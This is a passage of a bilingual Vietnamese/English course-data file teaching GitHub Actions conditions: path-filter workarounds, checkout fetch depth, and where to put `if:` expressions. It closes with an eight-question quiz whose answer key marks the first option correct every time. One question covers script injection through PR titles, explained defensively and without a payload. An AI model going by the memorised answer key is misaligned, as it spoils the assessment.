</div>

<div class="callout warn">
<p><strong>Cả bốn đều hỏng ÂM THẦM, và ba trong bốn hỏng theo hướng ĐÓNG.</strong> Một bước không bao giờ chạy thì không đẻ ra dòng log nào nói vậy, ngoài chữ "skipped" trên trang lần chạy, mà chữ đó trông y hệt một bước LẼ RA phải bị bỏ qua. Không có gì cảnh báo bạn. Cách phát hiện đáng tin duy nhất là nhìn một lần chạy thật rồi kiểm xem những bước bạn mong bị bỏ qua có bị bỏ qua không, và những bước bạn mong chạy có chạy không.</p>
</div>

<h3>Cách vá bộ lọc đường dẫn của bài 1.5, viết cho tử tế</h3>
<p>Bài 1.5 cho thấy vì sao <code>paths:</code> trên một kích hoạt <code>pull_request</code> chặn đứng một ô kiểm bắt buộc vĩnh viễn, và nói cách vá là đưa điều kiện vào BÊN TRONG job. Nó trông như thế này:</p>

<pre><code>jobs:
  kiem:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - id: doi
        run: |
          <span class="tok-comment"># co file nao trong src/ doi khong?</span>
          if git diff --name-only origin/\${{ github.base_ref }}...HEAD \\
             | grep -q '^src/'; then
            echo "co=true" &gt;&gt; \$GITHUB_OUTPUT
          else
            echo "co=false" &gt;&gt; \$GITHUB_OUTPUT
          fi

      - name: Kiem kieu
        if: steps.doi.outputs.co == 'true'
        run: npx tsc --noEmit</code></pre>

<div class="callout">
<p><strong>Job LUÔN chạy, nên ô kiểm bắt buộc LUÔN báo cáo.</strong> Khi không có gì liên quan thay đổi thì bước đắt tiền bị bỏ qua và job kết thúc xanh trong vài giây, đúng thứ branch protection cần. Để ý phép so sánh: <code>steps.doi.outputs.co == 'true'</code> so với CHUỖI, vì output của bước bao giờ cũng là chuỗi — <code>if: steps.doi.outputs.co</code> sẽ ĐÚNG cho cả <code>'true'</code> lẫn <code>'false'</code>, tức là cái bẫy của bài 3.3 quay vào bằng cửa sau.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — <code>git diff</code> trong bước ấy cần phần lịch sử mà checkout mặc định KHÔNG tải về.</strong> <code>actions/checkout</code> mặc định <code>fetch-depth: 1</code>: một commit, không có nhánh gốc, không có merge base. Câu diff bên trên sẽ hỏng với <code>unknown revision</code>. Hoặc thêm <code>fetch-depth: 0</code> — tải về tất, mà với một kho lớn thì đó là một cái giá thật — hoặc dùng một action dựng riêng cho việc này, thứ chỉ tải về đúng phần nó cần. Đây là lý do phổ biến nhất khiến một bước đếm-file-đã-đổi viết tay không chạy được ngay lần đầu.</p>
</div>

<h3>Đặt một điều kiện ở đâu</h3>
<div class="kv-grid">
<div class="kv"><span class="k">trên một bước</span><span class="v">rẻ nhất. Job vẫn khởi động nên ô kiểm của nó vẫn báo cáo; một bước bị bỏ qua tốn 0 giây, đo ở bài 2.4</span></div>
<div class="kv"><span class="k">trên một job</span><span class="v">bỏ qua cả job — và nhớ rằng việc bỏ qua <strong>LAN TRUYỀN</strong> sang mọi thứ có <code>needs:</code> trỏ tới nó. Một job có điều kiện nằm giữa một chuỗi sẽ vô hiệu hoá phần còn lại của chuỗi, mà đó thường không phải ý định</span></div>
<div class="kv"><span class="k">trên kích hoạt (<code>paths:</code>, <code>branches:</code>)</span><span class="v">rẻ nhất trong tất cả — không gì khởi động — nhưng VÔ HÌNH với các ô kiểm bắt buộc. Đúng cho <code>push</code>, nguy hiểm cho <code>pull_request</code></span></div>
<div class="kv"><span class="k">bên trong script</span><span class="v">một câu <code>if</code> của bash. Được, và đôi khi còn rõ hơn — nhưng bước báo cáo thành công trong cả hai trường hợp, nên trang lần chạy không cho bạn thấy đã đi đường nào. Hãy ưu tiên <code>if:</code> ở mức workflow khi bạn muốn việc bỏ qua NHÌN THẤY ĐƯỢC</span></div>
</div>

<div class="callout ok">
<p><strong>Một câu.</strong> Mỗi điều kiện thêm vào một cấu hình mà phần lớn lần chạy không đi qua, nên kỷ luật hữu ích là viết ÍT điều kiện, so sánh chuỗi một cách tường minh, và kiểm chứng từng cái bằng một lần chạy có hiện việc bỏ qua — bởi cái TỆP không nói được cho bạn biết một điều kiện có hoạt động không, còn trang lần chạy thì nói được.</p>
</div>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Workflow syntax: jobs.&lt;id&gt;.steps[*].if</span><span class="lc-sub">docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsif — <code>if:</code> được phép ở đâu, cái <code>success()</code> ngầm định, và ghi chú rằng cặp ngoặc là tuỳ chọn vì giá trị vốn đã là một biểu thức.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">actions/checkout — fetch-depth</span><span class="lc-sub">github.com/actions/checkout#usage — mặc định <code>fetch-depth: 1</code> và giá phải trả cho <code>0</code>, đó là đáp án cho cái bẫy <code>git diff</code> bên trên.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Contexts: context steps</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/contexts#steps-context — định nghĩa <code>outcome</code> và <code>conclusion</code> đặt cạnh nhau, phát biểu rõ nhất về chỗ khác biệt làm vỡ cái điều kiện chết thứ hai bên trên.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Deploy VPS — cái nhánh bạn không bao giờ đi là cái nhánh đang hỏng</span><span class="lc-sub">/courses/deploy-vps/learn${REF} — một đường lùi bản chưa từng được đi qua và đã không hoạt động vào lúc cần tới, cùng thói quen chạy cái nhánh bất thường ấy CÓ CHỦ Ý trước khi bạn cần nó.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.6 ─────────────────────────── */
    {
      title: '3.6 — Chapter 3 quiz|||3.6 — Kiểm tra Chương 3',
      slug: 'ga-3-6-kiem-tra',
      type: 'QUIZ',
      description: 'Tám câu: ranh giới thay-chữ, 74 biểu thức thật, `if: \'false\'` chạy bước, `outcome` khác `conclusion`, và bản tái lập `hashFiles()` đã khớp chính xác với log thật.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Quiz</span>
<h2>What Chapter 3 measured</h2>
<p class="lead">Eight questions, twelve minutes. The centrepiece of this chapter is a verification: a six-line reproduction of <code>hashFiles()</code> matched GitHub&#39;s real output to all sixty-four hex characters.</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">3.1 — the boundary</span><span class="lz-lnote"><code>\${{ }}</code> is substituted into the script <em>before</em> the shell exists; the log confirms it with <code>shell: /usr/bin/bash -e {0}</code> on every step</span></div>
<div class="lz-layer"><span class="lz-lname">3.2 — contexts</span><span class="lz-lnote">74 expressions in this repository: <code>secrets</code> 44, <code>env</code> 9, <code>runner</code> 5. An unavailable context evaluates to empty, never to an error</span></div>
<div class="lz-layer"><span class="lz-lname">3.3 — coercion</span><span class="lz-lnote">a real YAML parser shows <code>if: false</code> arriving as a boolean and <code>if: 'false'</code> as a non-empty string — so the second one runs the step</span></div>
<div class="lz-layer"><span class="lz-lname">3.4 — functions</span><span class="lz-lnote"><code>hashFiles()</code> reproduced and verified against job 85355071479; the concatenation is binary and the file list is sorted</span></div>
<div class="lz-layer"><span class="lz-lname">3.5 — conditions</span><span class="lz-lnote">three <code>if:</code> conditions in 1,394 lines of YAML, and four common conditions that can never be true</span></div>
</div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Kiểm tra</span>
<h2>Chương 3 đã đo được gì</h2>
<p class="lead">Tám câu, mười hai phút. Trung tâm của chương này là một phép KIỂM CHỨNG: một bản tái lập <code>hashFiles()</code> dài sáu dòng đã khớp với đầu ra thật của GitHub tới cả sáu mươi tư ký tự hex.</p>

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">3.1 — ranh giới</span><span class="lz-lnote"><code>\${{ }}</code> bị thay vào script <em>TRƯỚC</em> khi shell tồn tại; log xác nhận bằng dòng <code>shell: /usr/bin/bash -e {0}</code> ở mọi bước</span></div>
<div class="lz-layer"><span class="lz-lname">3.2 — context</span><span class="lz-lnote">74 biểu thức trong kho này: <code>secrets</code> 44, <code>env</code> 9, <code>runner</code> 5. Một context không dùng được thì tính ra RỖNG, không bao giờ ra lỗi</span></div>
<div class="lz-layer"><span class="lz-lname">3.3 — ép kiểu</span><span class="lz-lnote">một bộ đọc YAML thật cho thấy <code>if: false</code> tới nơi dưới dạng boolean còn <code>if: 'false'</code> dưới dạng chuỗi khác rỗng — nên cái thứ hai CHẠY bước</span></div>
<div class="lz-layer"><span class="lz-lname">3.4 — hàm</span><span class="lz-lnote"><code>hashFiles()</code> tái lập và kiểm chứng với job 85355071479; phép nối là NHỊ PHÂN và danh sách file được SẮP XẾP</span></div>
<div class="lz-layer"><span class="lz-lname">3.5 — điều kiện</span><span class="lz-lnote">ba điều kiện <code>if:</code> trên 1.394 dòng YAML, và bốn điều kiện phổ biến không bao giờ đúng được</span></div>
</div>
</div>
`,
      quiz: {
        timeLimitSeconds: 720,
        questions: [
          {
            question: 'Why does putting `\${{ github.event.pull_request.title }}` directly inside a `run:` block allow command execution?|||Vì sao đặt `\${{ github.event.pull_request.title }}` thẳng vào một khối `run:` lại cho phép chạy lệnh tuỳ ý?',
            options: [
              'The expression is replaced with raw text before the runner writes the script file, so quotes and semicolons in the title become part of the script itself|||Biểu thức bị thay bằng chữ thô TRƯỚC khi runner ghi tệp script, nên dấu nháy và dấu chấm phẩy trong tiêu đề trở thành một phần của CHÍNH script',
              'Because the shell expands \${{ }} at runtime, and shell expansion is unsafe|||Vì shell nở \${{ }} lúc chạy, và phép nở của shell thì không an toàn',
              'It does not — GitHub escapes context values automatically before substitution|||Không hề — GitHub tự động thoát các giá trị context trước khi thay',
              'Only if the workflow uses pull_request_target; under pull_request it is safe|||Chỉ khi workflow dùng pull_request_target; dưới pull_request thì an toàn',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'A step references `\${{ steps.tag.outputs.version }}` but the step with that id never wrote to $GITHUB_OUTPUT. What happens?|||Một bước tham chiếu `\${{ steps.tag.outputs.version }}` nhưng bước mang id ấy chưa từng ghi vào $GITHUB_OUTPUT. Chuyện gì xảy ra?',
            options: [
              'The expression evaluates to an empty string — no error, no warning, and the step usually succeeds at doing nothing|||Biểu thức tính ra chuỗi rỗng — không lỗi, không cảnh báo, và bước thường thành công trong việc chẳng làm gì',
              'The workflow fails to parse and the run never starts|||Workflow không đọc được và lần chạy không bao giờ khởi động',
              'The step fails with "output not found"|||Bước hỏng với thông báo "output not found"',
              'GitHub falls back to the value from the previous run of the same step|||GitHub lùi về giá trị của lần chạy trước của cùng bước ấy',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'Measured with a real YAML parser: `if: false` skips the step. What does `if: \'false\'` do?|||Đo bằng một bộ đọc YAML thật: `if: false` bỏ qua bước. Vậy `if: \'false\'` làm gì?',
            options: [
              'Runs the step — YAML hands over the string "false", which is non-empty, and a non-empty string is true|||CHẠY bước — YAML trao qua chuỗi "false", chuỗi ấy khác rỗng, và chuỗi khác rỗng là ĐÚNG',
              'Skips the step, identically — the quotes make no difference|||Bỏ qua bước, y hệt — cặp nháy không tạo khác biệt gì',
              'Fails the workflow with a type error|||Làm workflow hỏng với một lỗi kiểu',
              'Skips the step, but only because YAML 1.1 coerces the quoted form back to a boolean|||Bỏ qua bước, nhưng chỉ vì YAML 1.1 ép dạng có nháy trở lại thành boolean',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'A step has `continue-on-error: true` and fails. A later step has `if: steps.x.conclusion == \'failure\'`. Does it run?|||Một bước có `continue-on-error: true` và nó hỏng. Một bước sau có `if: steps.x.conclusion == \'failure\'`. Nó có chạy không?',
            options: [
              'No — continue-on-error rewrites conclusion to success. The pre-tolerance result is outcome, so the condition must read outcome|||Không — continue-on-error viết lại conclusion thành success. Kết quả trước-khi-dung-thứ là outcome, nên điều kiện phải đọc outcome',
              'Yes — conclusion always reports the raw result of the step|||Có — conclusion luôn báo cáo kết quả thô của bước',
              'Yes, but only if the later step also sets continue-on-error|||Có, nhưng chỉ khi bước sau cũng đặt continue-on-error',
              'No, because any step after a failure is skipped regardless of its condition|||Không, vì mọi bước sau một cú hỏng đều bị bỏ qua bất kể điều kiện của nó',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'A six-line reproduction of hashFiles() was checked against a real run. What did the check establish?|||Một bản tái lập hashFiles() dài sáu dòng được đối chiếu với một lần chạy thật. Phép đối chiếu ấy xác lập được gì?',
            options: [
              'The per-file hashes are concatenated as binary, not as hex strings, and the file list is sorted — the predicted key matched the log exactly|||Các hash của từng file được nối dưới dạng NHỊ PHÂN chứ không phải chuỗi hex, và danh sách file được SẮP XẾP — khoá dự đoán khớp chính xác với log',
              'That hashFiles adds a repository-specific salt, so keys cannot be predicted from outside|||Rằng hashFiles thêm một chuỗi muối riêng theo kho, nên không đoán được khoá từ bên ngoài',
              'That hashFiles hashes file paths rather than file contents|||Rằng hashFiles băm ĐƯỜNG DẪN file chứ không băm NỘI DUNG file',
              'That the result depends on the order the patterns are passed in|||Rằng kết quả phụ thuộc vào thứ tự các mẫu được truyền vào',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'A cache key contains a hashFiles() call whose glob matches nothing. What is the key?|||Một khoá cache chứa lời gọi hashFiles() mà mẫu glob của nó không khớp gì. Khoá ấy là gì?',
            options: [
              'The prefix followed by nothing — hashFiles returns an empty string, giving a constant key that never invalidates|||Phần tiền tố rồi hết — hashFiles trả về chuỗi rỗng, cho ra một khoá HẰNG không bao giờ hết hiệu lực',
              'Invalid — the workflow fails at parse time|||Không hợp lệ — workflow hỏng ngay lúc đọc tệp',
              'A hash of the empty set, which is a fixed non-empty value|||Một hash của tập rỗng, tức một giá trị cố định khác rỗng',
              'The cache step is skipped automatically|||Bước cache tự động bị bỏ qua',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'Which condition can never be true?|||Điều kiện nào KHÔNG BAO GIỜ có thể đúng?',
            options: [
              'if: github.ref == \'main\' — github.ref is a full ref such as refs/heads/main, or refs/pull/N/merge on a PR|||if: github.ref == \'main\' — github.ref là một ref đầy đủ như refs/heads/main, hoặc refs/pull/N/merge trên một PR',
              'if: github.ref == \'refs/heads/main\'|||if: github.ref == \'refs/heads/main\'',
              'if: startsWith(github.ref, \'refs/tags/\')|||if: startsWith(github.ref, \'refs/tags/\')',
              'if: inputs.version != \'\'|||if: inputs.version != \'\'',
            ],
            correctIndex: 0,
            points: 1,
          },
          {
            question: 'A step is written `if: always() && github.ref == \'refs/heads/main\'`. What is the effect people usually do not intend?|||Một bước viết `if: always() && github.ref == \'refs/heads/main\'`. Hệ quả nào người ta thường KHÔNG định?',
            options: [
              'Using any status function removes the implicit success(), so the step now runs on main even when an earlier step failed|||Dùng bất kỳ hàm trạng thái nào cũng gỡ mất success() ngầm định, nên bước ấy giờ chạy trên main KỂ CẢ khi một bước trước đó đã hỏng',
              'always() overrides the branch comparison, so the step runs on every branch|||always() ghi đè phép so sánh nhánh, nên bước chạy trên mọi nhánh',
              'The two conditions cannot be combined, so the workflow fails to parse|||Hai điều kiện ấy không kết hợp được nên workflow không đọc được',
              'always() makes the step run twice, once per evaluation pass|||always() làm bước chạy hai lần, mỗi lượt đánh giá một lần',
            ],
            correctIndex: 0,
            points: 1,
          },
        ],
      },
    },
  ],
};
